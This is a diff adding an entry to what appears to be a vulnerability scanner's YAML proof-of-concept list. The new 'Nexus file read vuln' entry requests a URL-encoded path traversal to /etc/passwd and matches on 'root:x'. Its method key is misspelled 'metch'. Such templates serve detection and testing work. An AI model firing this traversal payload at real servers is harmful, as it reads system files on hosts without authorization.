@@ -415,3 +415,9 @@ pocs:
       - 'for 16-bit app support'
     matchers-condition: or
     name: "Vue3 file read vuln"
+  - metch: "get"
+    path: '/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+    body:
+      - 'root:x'
+    matchers-condition: or
+    name: "Nexus file read vuln"
